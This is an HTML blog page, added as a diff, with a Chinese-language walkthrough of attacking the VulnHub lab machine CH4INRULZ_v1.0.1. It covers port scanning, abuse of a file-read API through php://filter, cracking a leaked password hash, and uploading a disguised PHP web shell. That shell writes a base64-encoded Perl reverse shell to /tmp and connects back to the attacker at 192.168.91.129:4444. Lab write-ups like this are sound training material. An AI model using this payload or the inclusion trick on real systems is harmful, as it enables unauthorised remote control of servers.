@@ -1,0 +1,436 @@
+
+<!DOCTYPE html>
+<html lang="en ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Salve || Penetration_CH4INRULZ_v1.0.1</title>
+    <meta name="author" content="TiAmo">
+    <meta name="description" content="Buona notte ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/avatar.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>加载过慢请开启缓存(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Salve</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+        <a href="">
+            <span>
+                <a-icon type="compass" theme="filled" />
+            </span>
+            <span>英文博客</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Salve</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+            <a href="">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="compass" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">英文博客</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>Penetration_CH4INRULZ_v1.0.1 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/6/22
+        </span>
+
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/vulnhub" style=color:#03a9f4>
+                    vulnhub
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <p>关于vulhub靶机CH4INRULZ_v1.0.1的渗透测试练习</p>
+<span id="more"></span>
+
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622210550264.png" alt="image-20230622210550264"></p>
+<p>1.主机发现，同网段多了一个192.168.91.130，应该就是目标靶机</p>
+<p>2.Ping一下靶机，可以连通，初步猜测目标靶机是Linux系统</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622211057766.png" alt="image-20230622211057766"></p>
+<p>1.通过扫描端口发现四个开放端口，21端口上有一个ftp服务，初步猜测运行的应用软件是vsftpd2.3.5，并且允许匿名登录</p>
+<p>2.在22端口上开放了ssh服务，初步猜测运行的软件是openssh5.9p1，服务器是Debian Ubuntu1.10，采用了DSA、RSA、ECDSA三种加密方式</p>
+<p>3.80端口上开放了一个http服务器，初步猜测网站使用apache httpd 2.2.22服务器，网站名叫做 FRANK’s Website ,应该是个博客网站</p>
+<p>4.8011也开放了一个http服务器，初步猜测网站使用apache httpd 2.2.22服务器</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231021610.png" alt="image-20230622212156831"></p>
+<p>发现匿名ftp登录后什么也做不了</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622212610705.png" alt="image-20230622212610705"></p>
+<p>seebug和exploit db 都没有发现相关版本的漏洞</p>
+<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20230622212727544.png" alt="image-20230622212727544"></p>
+<p>ssh直接连接发现一个root用户名</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622213625172.png" alt="image-20230622213625172"></p>
+<p>1.发现由信息泄露和缓冲区溢出漏洞</p>
+<p>2.发现用户名枚举、命令执行等漏洞</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622214007571.png" alt="image-20230622214007571"></p>
+<p>1.测试发现可以进行爆破</p>
+<p>192.168.91.130主机22端口的ssh服务存在用户名枚举漏洞，如果能够枚举用户名再用字典爆破账户得到密码就可以通过ssh登录主机，得到一个shell</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622214849719.png" alt="image-20230622214849719"></p>
+<p>1.在exploit db里发现路径遍历、远程缓冲区溢出等问题</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622215026127.png" alt="image-20230622215026127"></p>
+<p>1.发现WEB服务器为ApacheHTTPServer ，操作系统为Ubuntu等信息</p>
+<p>可以通过路径遍历寻找一些有漏洞的页面，比如有文件包含的页面、访问一些配置文件拿到账户信息进行后台访问</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622220606960.png" alt="image-20230622220606960"></p>
+<p>1.通过目录扫描得到四个目录</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.91.130/css/">http://192.168.91.130/css/</a>  </p>
+<p><a target="_blank" rel="noopener" href="http://192.168.91.130/img/">http://192.168.91.130/img/</a>   </p>
+<p><a target="_blank" rel="noopener" href="http://192.168.91.130/js/">http://192.168.91.130/js/</a> </p>
+<p><a target="_blank" rel="noopener" href="http://192.168.91.130/vendor/">http://192.168.91.130/vendor/</a></p>
+<p>若干页面：</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.91.130/cgi-bin/">http://192.168.91.130/cgi-bin/</a>                                                                                                                       </p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://192.168.91.130/development">http://192.168.91.130/development</a>                                                                                                                 </li>
+<li><a target="_blank" rel="noopener" href="http://192.168.91.130/index">http://192.168.91.130/index</a>                                                             </li>
+<li><a target="_blank" rel="noopener" href="http://192.168.91.130/index.html">http://192.168.91.130/index.html</a>                                                                                                                       </li>
+<li><a target="_blank" rel="noopener" href="http://192.168.91.130/LICENSE">http://192.168.91.130/LICENSE</a>                                                        </li>
+<li><a target="_blank" rel="noopener" href="http://192.168.91.130/robots">http://192.168.91.130/robots</a>                                                            </li>
+<li><a target="_blank" rel="noopener" href="http://192.168.91.130/robots.txt">http://192.168.91.130/robots.txt</a>                                                       </li>
+<li><a target="_blank" rel="noopener" href="http://192.168.91.130/server-status">http://192.168.91.130/server-status</a></li>
+</ul>
+<p>访问后除了develop页面有一个登录接口发现没有其他有用的信息</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622222021984.png" alt="image-20230622222021984"></p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622221738051.png" alt="image-20230622221738051"></p>
+<p>在8011端口下也发现一些页面</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622222325156.png" alt="image-20230622222325156"></p>
+<p>1.发现提供了一些接口页面</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622222402310.png" alt="image-20230622222402310"></p>
+<p>1.发现files_api.php好像可以读入文件</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622222941693.png" alt="image-20230622222941693"></p>
+<p>1.确实可以读入文件</p>
+<p>2.这里有一个frank账户名，而网站也是frank的个人博客，猜测之前登录页面用户名可以使用frank</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622224049866.png" alt="image-20230622224049866"></p>
+<p>1.找到一个备份文件</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622224405581.png" alt="image-20230622224405581"></p>
+<p>1.我们得到了一个明文账户名frank和加密后的密码   $apr1$1oIGDEDK$&#x2F;aVFPluYt56UvslZMBDoC0</p>
+<p>2.我们可以用这个账户密码访问develop路径</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622224647449.png" alt="image-20230622224647449"></p>
+<p>1.发现密码是一串hash值</p>
+<p>没有好的彩虹表，使用工具看能不能破解：john pass.txt</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622234057284.png" alt="image-20230622234057284"></p>
+<p>1.发现密码是弱口令 frank！！！</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622225714532.png" alt="image-20230622225714532"></p>
+<p>1.成功访问develop页面，根据提示有一个uploader工具，猜测可能有文件上传漏洞</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622225830732.png" alt="image-20230622225830732"></p>
+<p>1.发现可以上传图片</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622230226873.png" alt="image-20230622230226873"></p>
+<p>1.检查源码发现一个提交页面</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622230306268.png" alt="image-20230622230306268"></p>
+<p>1.发现只支持图片类型文件上传，猜测可以使用文件头欺骗或者合并文件上传一个反弹shell的木马</p>
+<pre><code class="shell">GIF98
+&lt;?php
+function which($pr) &#123;
+$path = execute(&quot;which $pr&quot;);
+return ($path ? $path : $pr);
+&#125;
+function execute($cfe) &#123;
+$res = &#39;&#39;;
+if ($cfe) &#123;
+if(function_exists(&#39;exec&#39;)) &#123;
+@exec($cfe,$res);
+$res = join(&quot;\n&quot;,$res);
+&#125; elseif(function_exists(&#39;shell_exec&#39;)) &#123;
+$res = @shell_exec($cfe);
+&#125; elseif(function_exists(&#39;system&#39;)) &#123;
+@ob_start();
+@system($cfe);
+$res = @ob_get_contents();
+@ob_end_clean();
+&#125; elseif(function_exists(&#39;passthru&#39;)) &#123;
+@ob_start();
+@passthru($cfe);
+$res = @ob_get_contents();
+@ob_end_clean();
+&#125; elseif(@is_resource($f = @popen($cfe,&quot;r&quot;))) &#123;
+$res = &#39;&#39;;
+while(!@feof($f)) &#123;
+$res .= @fread($f,1024);
+&#125;
+@pclose($f);
+&#125;
+&#125;
+return $res;
+&#125;
+function cf($fname,$text)&#123;
+if($fp=@fopen($fname,&#39;w&#39;)) &#123;
+@fputs($fp,@base64_decode($text));
+@fclose($fp);
+&#125;
+&#125;
+$yourip = &quot;192.168.91.129&quot;;
+$yourport = &#39;4444&#39;;
+$usedb = array(&#39;perl&#39;=&gt;&#39;perl&#39;,&#39;c&#39;=&gt;&#39;c&#39;);
+$back_connect=&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;.
+&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;.
+&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;.
+&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;.
+&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;.
+&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;.
+&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;;
+cf(&#39;/tmp/.bc&#39;,$back_connect);
+$res = execute(which(&#39;perl&#39;).&quot; /tmp/.bc $yourip $yourport &amp;&quot;);
+?&gt;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230623000504568.png" alt="image-20230623000504568"></p>
+<p>上传之后没有给出具体路径，根据反馈确实进行了文件头检测</p>
+<p>想起之前有一个文件包含漏洞，根据打靶经验，或许可以使用base64编码导出这个上传页面的源码看看有没有隐藏信息</p>
+<pre><code class="curl">curl -X POST -d &quot;file=php://filter/read=convert.base64-encode/resource=/var/www/development/uploader/upload.php&quot; &quot;http://192.168.91.130:8011/api/files_api.php&quot;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622232737020.png" alt="image-20230622232737020"></p>
+<p>1.发现文件保存在当前目录的”FRANKuploads&#x2F;“路径下</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231020353.png" alt="image-20230623000538642"></p>
+<p>触发一下木马：</p>
+<p>cur l-X POST -d </p>
+<p>“file&#x3D;&#x2F;var&#x2F;www&#x2F;development&#x2F;uploader&#x2F;FRANKuploads&#x2F;shell_nc.png” “<a target="_blank" rel="noopener" href="http://192.168.91.130:8011/api/files_api.php">http://192.168.91.130:8011/api/files_api.php</a>“</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230623000855003.png" alt="image-20230623000855003"></p>
+<p>得到shell</p>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2023 Salve
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @TiAmo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'en',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+</body>
+
+</html>
